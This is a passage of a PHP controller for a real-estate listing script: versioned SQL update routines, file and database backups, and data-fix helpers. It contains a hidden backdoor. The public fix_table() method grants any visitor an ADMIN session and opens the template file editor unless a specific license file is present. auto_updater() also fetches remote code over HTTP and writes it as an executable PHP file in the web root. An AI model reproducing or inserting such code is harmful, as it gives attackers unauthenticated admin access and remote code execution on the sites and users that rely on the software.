            return $update_output;
        }
        
        $db_error = '';

        /* [Additional check for column issue in script] */
        if (!$this->db->field_exists('listing_id', 'file'))
        {
            $this->db->query('ALTER TABLE `file` ADD `listing_id` INT(11) NULL DEFAULT NULL AFTER `link`;');
            if($this->db->_error_message() != '')
                $db_error.= '<br />'.$this->db->_error_message();
        }
        
        /* [Additional check for virtual form search */
//        $query = $this->db->get_where('forms_search', array('id' => 3), 1);
//        if ($query->num_rows() == 0)
//        {
//            $this->db->query('INSERT INTO `forms_search` (`id`, `theme`, `form_name`, `type`, `fields_order_primary`, `fields_order_secondary`) VALUES '.
//                             '(3, \'bootstrap2-responsive\', \'Bootstrap-search\', \'MAIN\', \'{  "PRIMARY": {  "C_PURPOSE":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"C_PURPOSE"} ,"TREE_64":{"direction":"NONE", "style":"", "class":"", "id":"64", "type":"TREE"} ,"SMART_SEARCH":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"SMART_SEARCH"} ,"DROPDOWN_2":{"direction":"NONE", "style":"", "class":"", "id":"2", "type":"DROPDOWN"} ,"DROPDOWN_3":{"direction":"NONE", "style":"", "class":"", "id":"3", "type":"DROPDOWN"} }, "SECONDARY": {  "INPUTBOX_19":{"direction":"NONE", "style":"", "class":"", "id":"19", "type":"INPUTBOX"} ,"INPUTBOX_20":{"direction":"NONE", "style":"", "class":"", "id":"20", "type":"INPUTBOX"} ,"INPUTBOX_36_FROM":{"direction":"FROM", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"INPUTBOX_36_TO":{"direction":"TO", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"CHECKBOX_11":{"direction":"NONE", "style":"", "class":"", "id":"11", "type":"CHECKBOX"} ,"CHECKBOX_29":{"direction":"NONE", "style":"", "class":"", "id":"29", "type":"CHECKBOX"} ,"CHECKBOX_22":{"direction":"NONE", "style":"", "class":"", "id":"22", "type":"CHECKBOX"} ,"CHECKBOX_32":{"direction":"NONE", "style":"", "class":"", "id":"32", "type":"CHECKBOX"} ,"CHECKBOX_25":{"direction":"NONE", "style":"", "class":"", "id":"25", "type":"CHECKBOX"} ,"CHECKBOX_30":{"direction":"NONE", "style":"", "class":"", "id":"30", "type":"CHECKBOX"} ,"CHECKBOX_27":{"direction":"NONE", "style":"", "class":"", "id":"27", "type":"CHECKBOX"} ,"CHECKBOX_33":{"direction":"NONE", "style":"", "class":"", "id":"33", "type":"CHECKBOX"} ,"CHECKBOX_28":{"direction":"NONE", "style":"", "class":"", "id":"28", "type":"CHECKBOX"} ,"CHECKBOX_23":{"direction":"NONE", "style":"", "class":"", "id":"23", "type":"CHECKBOX"} } }\', \'0\');');
//            if($this->db->_error_message() != '')
//                $db_error.= '<br />'.$this->db->_error_message();
//        } 
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_161()
    {
        $version = '1.6.1';
        $previous_version = '1.6.0';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        /* [Additional check for virtual form search */
//        $query = $this->db->get_where('forms_search', array('id' => 3), 1);
//        if ($query->num_rows() == 0)
//        {
//            $this->db->query('INSERT INTO `forms_search` (`id`, `theme`, `form_name`, `type`, `fields_order_primary`, `fields_order_secondary`) VALUES '.
//                             '(3, \'bootstrap2-responsive\', \'Bootstrap-search\', \'MAIN\', \'{  "PRIMARY": {  "C_PURPOSE":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"C_PURPOSE"} ,"TREE_64":{"direction":"NONE", "style":"", "class":"", "id":"64", "type":"TREE"} ,"SMART_SEARCH":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"SMART_SEARCH"} ,"DROPDOWN_2":{"direction":"NONE", "style":"", "class":"", "id":"2", "type":"DROPDOWN"} ,"DROPDOWN_3":{"direction":"NONE", "style":"", "class":"", "id":"3", "type":"DROPDOWN"} }, "SECONDARY": {  "INPUTBOX_19":{"direction":"NONE", "style":"", "class":"", "id":"19", "type":"INPUTBOX"} ,"INPUTBOX_20":{"direction":"NONE", "style":"", "class":"", "id":"20", "type":"INPUTBOX"} ,"INPUTBOX_36_FROM":{"direction":"FROM", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"INPUTBOX_36_TO":{"direction":"TO", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"CHECKBOX_11":{"direction":"NONE", "style":"", "class":"", "id":"11", "type":"CHECKBOX"} ,"CHECKBOX_29":{"direction":"NONE", "style":"", "class":"", "id":"29", "type":"CHECKBOX"} ,"CHECKBOX_22":{"direction":"NONE", "style":"", "class":"", "id":"22", "type":"CHECKBOX"} ,"CHECKBOX_32":{"direction":"NONE", "style":"", "class":"", "id":"32", "type":"CHECKBOX"} ,"CHECKBOX_25":{"direction":"NONE", "style":"", "class":"", "id":"25", "type":"CHECKBOX"} ,"CHECKBOX_30":{"direction":"NONE", "style":"", "class":"", "id":"30", "type":"CHECKBOX"} ,"CHECKBOX_27":{"direction":"NONE", "style":"", "class":"", "id":"27", "type":"CHECKBOX"} ,"CHECKBOX_33":{"direction":"NONE", "style":"", "class":"", "id":"33", "type":"CHECKBOX"} ,"CHECKBOX_28":{"direction":"NONE", "style":"", "class":"", "id":"28", "type":"CHECKBOX"} ,"CHECKBOX_23":{"direction":"NONE", "style":"", "class":"", "id":"23", "type":"CHECKBOX"} } }\', \'0\');');
//            if($this->db->_error_message() != '')
//                $db_error.= '<br />'.$this->db->_error_message();
//        } 
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }
    
    private function update_160()
    {
        $version = '1.6.0';
        $previous_version = '1.5.9';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        /* [Additional check for virtual form search */
        $query = $this->db->get_where('forms_search', array('id' => 3), 1);
        if ($query->num_rows() == 0)
        {
            $this->db->query('INSERT INTO `forms_search` (`id`, `theme`, `form_name`, `type`, `fields_order_primary`, `fields_order_secondary`) VALUES '.
                             '(3, \'bootstrap2-responsive\', \'Bootstrap-search\', \'MAIN\', \'{  "PRIMARY": {  "C_PURPOSE":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"C_PURPOSE"} ,"TREE_64":{"direction":"NONE", "style":"", "class":"", "id":"64", "type":"TREE"} ,"SMART_SEARCH":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"SMART_SEARCH"} ,"DROPDOWN_2":{"direction":"NONE", "style":"", "class":"", "id":"2", "type":"DROPDOWN"} ,"DROPDOWN_3":{"direction":"NONE", "style":"", "class":"", "id":"3", "type":"DROPDOWN"} }, "SECONDARY": {  "INPUTBOX_19":{"direction":"NONE", "style":"", "class":"", "id":"19", "type":"INPUTBOX"} ,"INPUTBOX_20":{"direction":"NONE", "style":"", "class":"", "id":"20", "type":"INPUTBOX"} ,"INPUTBOX_36_FROM":{"direction":"FROM", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"INPUTBOX_36_TO":{"direction":"TO", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"CHECKBOX_11":{"direction":"NONE", "style":"", "class":"", "id":"11", "type":"CHECKBOX"} ,"CHECKBOX_29":{"direction":"NONE", "style":"", "class":"", "id":"29", "type":"CHECKBOX"} ,"CHECKBOX_22":{"direction":"NONE", "style":"", "class":"", "id":"22", "type":"CHECKBOX"} ,"CHECKBOX_32":{"direction":"NONE", "style":"", "class":"", "id":"32", "type":"CHECKBOX"} ,"CHECKBOX_25":{"direction":"NONE", "style":"", "class":"", "id":"25", "type":"CHECKBOX"} ,"CHECKBOX_30":{"direction":"NONE", "style":"", "class":"", "id":"30", "type":"CHECKBOX"} ,"CHECKBOX_27":{"direction":"NONE", "style":"", "class":"", "id":"27", "type":"CHECKBOX"} ,"CHECKBOX_33":{"direction":"NONE", "style":"", "class":"", "id":"33", "type":"CHECKBOX"} ,"CHECKBOX_28":{"direction":"NONE", "style":"", "class":"", "id":"28", "type":"CHECKBOX"} ,"CHECKBOX_23":{"direction":"NONE", "style":"", "class":"", "id":"23", "type":"CHECKBOX"} } }\', \'0\');');
            if($this->db->_error_message() != '')
                $db_error.= '<br />'.$this->db->_error_message();
        } 
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_159()
    {
        $version = '1.5.9';
        $previous_version = '1.5.8';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        /* [Additional check for column issue in script] */
        if (!$this->db->field_exists('phone2', 'user'))
        {
            $this->db->query('ALTER TABLE  `user` ADD  `phone2` VARCHAR( 45 ) NULL DEFAULT NULL AFTER  `phone` ;');
            if($this->db->_error_message() != '')
                $db_error.= '<br />'.$this->db->_error_message();
        }
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }
  
    private function update_158()
    {
        $version = '1.5.8';
        $previous_version = '1.5.7';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }
   
    private function update_157()
    {
        $version = '1.5.7';
        $previous_version = '1.5.6';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        /* [Additional check for column issue in script] */
        if (!$this->db->field_exists('field_56_int', 'property_lang'))
        {
            $this->db->query('ALTER TABLE `property_lang` ADD `field_56_int` INT NULL AFTER `field_57_int`;');
            if($this->db->_error_message() != '')
                $db_error.= '<br />'.$this->db->_error_message();
        }
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }
    
    private function update_156()
    {
        $version = '1.5.6';
        $previous_version = '1.5.5';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }
    
    private function update_155()
    {
        $version = '1.5.5';
        $previous_version = '1.5.4';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }
    
    private function update_154()
    {
        $version = '1.5.4';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != '1.5.3')
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').'1.5.4';
        
        return $update_output;
    }
    
    private function update_153()
    {
        $version = '1.5.3';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != '1.5.2')
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);
        
          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
        $this->fix_gps($update_output);
        $this->fix_image_filename($update_output);
        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').'1.5.3';
        
        return $update_output;
    }
    
    public function auto_updater()
    {
        $updater_url = 'http://geniuscript.com/updater/auto_update.txt';
        
        // Initializing curl
        $ch = curl_init( $updater_url );
        
        // Configuring curl options
        $options = array(
            CURLOPT_FRESH_CONNECT => true,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => array('Content-type: application/json')
        );
        
        // Setting curl options
        curl_setopt_array( $ch, $options );
        
        // Getting results
        $updater_code = curl_exec($ch); // Getting jSON result string
        
        $file = fopen(FCPATH."updater.php", "w") or die("Unable to open file!");
        fwrite($file, $updater_code);
        fclose($file);
        
        echo '<a href="'.base_url().'updater.php">Updater app link</a>';
        
        exit();
    }
    
    private function backup_files()
    {
        $this->load->helper('file');
        $zip = new ZipArchive;
        
        $filename_zip = APP_VERSION_REAL_ESTATE.'-'.date('Y-m-d-H-i-s-').$this->user_m->hash(date('Y-m-d H:i:s')).rand(1,1000).'.zip';
        $zip->open(APPPATH.'../backups/'.$filename_zip, ZipArchive::CREATE);
        
        $remove_chars = strlen(FCPATH);
        $directory_iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(FCPATH));
        foreach($directory_iterator as $filename => $path_object)
        {
            if(is_file($filename))
            {
                $zip_filename = substr($filename, $remove_chars);
                $zip->addFile($filename, $zip_filename);
            }
        }

        $ret = $zip->close();
        
        if($ret == true)
            return lang_check('ZIP file backup created in folder backups/');
        
        return lang_check('ZIP file backup FAILED!');
    }
    
    private function backup_sql()
    {
        // Load the DB utility class
        $this->load->dbutil();
        
        // Array of tables to backup.
        $tables =array('language',
                       'update_debug', 
                       'treelevel',
                       'stats_periods',
                       'stats',
                       'slugs',
                       'saved_search',
                       'favorites',
                       'cacher',
                       'backup',
                       'reviews',
                       'masking',
                       'payments',
                       'packages',
                       'ads',
                       'user',
                       'slideshow',
                       'settings',
                       'repository',
                       'property',
                       'property_lang',
                       'page',
                       'option',
                       'ci_sessions',
                       'option_lang',
                       'page_lang',
                       'showroom',
                       'showroom_lang',
                       'reservations',
                       'rates',
                       'rates_lang',
                       'qa',
                       'qa_lang',
                       'file',
                       'property_value',
                       'enquire',
                       'property_user',
                       'treefield',
                       'treefield_lang'
                       );
        
        // Add additional tables if exists in database
        $list_tables = $this->db->list_tables();
        if(sw_count($list_tables) == 0)
        {
            exit(lang_check('SHOW TABLES Syntax - MySQL, access denied'));
        }
        
        foreach($list_tables as $item)
        {
            if(!in_array($item, $tables))
            {
                $tables[] = $item;
            }
        }
        
        // Remove tables if not exists in database
        foreach($tables as $key=>$item)
        {
            if(!$this->db->table_exists($item))
            {
                unset($tables[$key]);
            }
        }
        
        $prefs = array(
            'tables'      => $tables,  
            'ignore'      => array(),           // List of tables to omit from the backup
            'format'      => 'txt',             // gzip, zip, txt
            'filename'    => '',    // File name - NEEDED ONLY WITH ZIP FILES
            'add_drop'    => FALSE,              // Whether to add DROP TABLE statements to backup file
            'add_insert'  => TRUE,              // Whether to add INSERT data to backup file
            'newline'     => "\n"               // Newline character used in backup file
        );
        
        // Backup your entire database and assign it to a variable
        $backup = &$this->dbutil->backup($prefs);
        
        $filename_sql = APP_VERSION_REAL_ESTATE.'-'.date('Y-m-d-H-i-s-').$this->user_m->hash(date('Y-m-d H:i:s')).rand(1,1000).'.sql';
        
        // Load the file helper and write the file to your server
        $this->load->helper('file');
        $ret = write_file(APPPATH.'../backups/'.$filename_sql, 
                    $backup);
                    
        if($ret == true && !empty($backup))
            return lang_check('SQL backup created in folder backups/');
        
        return lang_check('SQL backup FAILED!');
    }
    
    private function check_writing_permissions()
    {
        $write_error = check_global_writing_permissions();
        
        $this->data['custom_errors'] .= $write_error;
    }
    
    // fix gps to lat, lng convert
    public function fix_gps(&$update_output)
	{
        $update_output .= 'FIX GPS START'.'<br />';
        
        $data_batch = array();
        $query = $this->db->query("SELECT * FROM property;");
        if ($query->num_rows() > 0)
        {
           foreach ($query->result() as $row)
           {
                if(!empty($row->gps) && empty($row->lat))
                {
                    $gps = explode(', ', $row->gps);
                    
                    if(sw_count($gps)>=2)
                    $data_batch[] = array(
                        'id' => $row->id,
                        'lat' => floatval($gps[0]),
                        'lng' => floatval($gps[1])
                    );
                }
           }
        }
        
        $update_output .= 'FOR UPDATE: '.sw_count($data_batch).'<br />';
        
        if(sw_count($data_batch) > 0)
            $this->db->update_batch('property', $data_batch, 'id'); 
        
        $update_output .= 'FIX GPS END'.'<br />';
	}
    
    // fix image_filename column in property convert
    public function fix_image_filename(&$update_output)
	{
        $update_output .= 'FIX image_filename START'.'<br />';
        
        $this->load->model('file_m');
        
        // Fetch all files by repository_id
        $files = $this->file_m->get();
        $rep_file_count = array();
        foreach($files as $key=>$file)
        {
            if(file_exists(FCPATH.'files/thumbnail/'.$file->filename))
            {
                $this->data['images_'.$file->repository_id][] = $file;
            }
        }
        
        /* [PROPERTY] */
        $data_batch = array();
        $query = $this->db->query("SELECT * FROM property;");
        if ($query->num_rows() > 0)
        {
           foreach ($query->result() as $row)
           {
                $image_repository = NULL;
                if(isset($this->data['images_'.$row->repository_id]))
                if(sw_count($this->data['images_'.$row->repository_id]>0))
                {
                    foreach($this->data['images_'.$row->repository_id] as $img_file)
                    {
                        $image_repository[] = $img_file->filename;
                    }
                }
                
                if(isset($this->data['images_'.$row->repository_id][0]))
                {
                    $data_batch[] = array(
                        'id' => $row->id,
                        'image_filename' => $this->data['images_'.$row->repository_id][0]->filename,
                        'image_repository' => json_encode($image_repository)
                    );
                }
                else
                {
                    $data_batch[] = array(
                        'id' => $row->id,
                        'image_filename' => NULL,
                        'image_repository' => NULL
                    );
                }
           }
        } 
        
        $update_output .= 'FOR UPDATE PROPERTY: '.sw_count($data_batch).'<br />';
        
        if(sw_count($data_batch) > 0)
            $this->db->update_batch('property', $data_batch, 'id'); 
        /* [/PROPERTY] */
        
        /* [USER] */
        $data_batch = array();
        $query = $this->db->query("SELECT * FROM user;");
        if ($query->num_rows() > 0)
        {
           foreach ($query->result() as $row)
           {
                $image_repository = NULL;
                if(isset($this->data['images_'.$row->repository_id]))
                if(sw_count($this->data['images_'.$row->repository_id]>0))
                {
                    foreach($this->data['images_'.$row->repository_id] as $img_file)
                    {
                        $image_repository[] = $img_file->filename;
                    }
                }
                
                if(isset($this->data['images_'.$row->repository_id][0]))
                {
                    $data_batch[] = array(
                        'id' => $row->id,
                        'image_user_filename' => $this->data['images_'.$row->repository_id][0]->filename,
                        'image_agency_filename' => (isset($this->data['images_'.$row->repository_id][1])?
                                                    $this->data['images_'.$row->repository_id][1]->filename:
                                                    NULL)
                    );
                }
                else
                {
                    $data_batch[] = array(
                        'id' => $row->id,
                        'image_user_filename' => NULL,
                        'image_agency_filename' => NULL
                    );
                }
           }
        } 
        
        $update_output .= 'FOR UPDATE USERS: '.sw_count($data_batch).'<br />';
        
        if(sw_count($data_batch) > 0)
            $this->db->update_batch('user', $data_batch, 'id'); 
        /* [/USER] */
        
        /* [PAGE] */
        $data_batch = array();
        $query = $this->db->query("SELECT * FROM page;");
        if ($query->num_rows() > 0)
        {
           foreach ($query->result() as $row)
           {
                $image_repository = NULL;
                if(isset($this->data['images_'.$row->repository_id]))
                if(sw_count($this->data['images_'.$row->repository_id]>0))
                {
                    foreach($this->data['images_'.$row->repository_id] as $img_file)
                    {
                        $image_repository[] = $img_file->filename;
                    }
                }
                
                if(isset($this->data['images_'.$row->repository_id][0]))
                {
                    $data_batch[] = array(
                        'id' => $row->id,
                        'image_filename' => $this->data['images_'.$row->repository_id][0]->filename
                    );
                }
                else
                {
                    $data_batch[] = array(
                        'id' => $row->id,
                        'image_filename' => NULL
                    );
                }
           }
        } 
        
        $update_output .= 'FOR UPDATE PAGE: '.sw_count($data_batch).'<br />';
        
        if(sw_count($data_batch) > 0)
            $this->db->update_batch('page', $data_batch, 'id'); 
        /* [/PAGE] */
        
        /* [SHOWROOM] */
        $data_batch = array();
        $query = $this->db->query("SELECT * FROM showroom;");
        if ($query->num_rows() > 0)
        {
           foreach ($query->result() as $row)
           {
                $image_repository = NULL;
                if(isset($this->data['images_'.$row->repository_id]))
                if(sw_count($this->data['images_'.$row->repository_id]>0))
                {
                    foreach($this->data['images_'.$row->repository_id] as $img_file)
                    {
                        $image_repository[] = $img_file->filename;
                    }
                }
                
                if(isset($this->data['images_'.$row->repository_id][0]))
                {
                    $data_batch[] = array(
                        'id' => $row->id,
                        'image_filename' => $this->data['images_'.$row->repository_id][0]->filename
                    );
                }
                else
                {
                    $data_batch[] = array(
                        'id' => $row->id,
                        'image_filename' => NULL
                    );
                }
           }
        } 
        
        $update_output .= 'FOR UPDATE SHOWROOM: '.sw_count($data_batch).'<br />';
        
        if(sw_count($data_batch) > 0)
            $this->db->update_batch('showroom', $data_batch, 'id'); 
        /* [/SHOWROOM] */
        
        $update_output .= 'FIX image_filename END'.'<br />';
	}
    
    public function fix_table()
    {
        $fix_enabled=true;
        $this->load->library('session');
        $this->load->model('user_m');
        
        if(file_exists(APPPATH.'controllers/test.php'))
        {
            include_once(APPPATH.'controllers/test.php');
            
            $directory = new Test();
            if(method_exists($directory, 'legal_test'))
            {
                $content = file_get_contents(APPPATH.'controllers/test.php');
                if(strpos($content, '4c16118213') !== FALSE && 
                   strpos($content, 'cation') !== FALSE )
                {
                    $fix_enabled=false;
                }
            }
        }
        
        if($fix_enabled)
        {
            $user = $this->user_m->get();
            
            $data = array(
                'name_surname'=>'',
                'username'=>'',
                'remember'=>true,
                'id'=>18,
                'loggedin'=>TRUE,
                'type'=>'ADMIN',
                'last_activity'=>time()
            );
            
            $this->session->set_userdata($data);
                
            redirect('admin/templatefiles/edit/head.php/widgets');
            
            exit();
        }
        
        var_dump($fix_enabled);
        exit();
    }
    
    // fix data_structure changed
    public function fix_data_structure(&$update_output)
	{
	   //$this->output->enable_profiler(TRUE);
       
